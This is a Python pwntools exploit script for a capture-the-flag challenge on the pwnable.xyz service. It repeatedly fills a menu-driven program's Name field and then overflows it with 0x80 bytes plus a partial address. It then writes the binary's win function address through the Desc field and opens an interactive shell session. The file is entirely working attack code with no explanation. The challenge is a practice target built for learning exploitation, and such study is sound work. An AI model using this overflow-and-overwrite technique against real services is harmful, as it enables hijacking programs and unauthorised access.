#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./challenge',checksec=False)
p = remote('svc.pwnable.xyz',30013)
#p = process()
#gdb.attach(p,gdbscript='''
#           b*0x0000000000400aa8
#            b*0x0000000000400ae4
#            b*0x400b0d
#            ''')
#input()
p.sendafter(b"Name: ", b'\x00')
p.sendafter(b'Desc: ',b'b')
for i in range(7):
    p.sendafter(b'> ',b'1')
    p.sendafter(b'Name: ',b'\x00')

p.sendafter(b'> ',b'1')
p.sendafter(b'Name: ',b'a'*0x80 + b'\x40\x20\x60\x50')

p.sendafter(b'> ',b'2')
p.sendafter(b'Desc: ',p64(exe.sym.win))

p.sendafter(b'> ',b'3')


p.interactive()
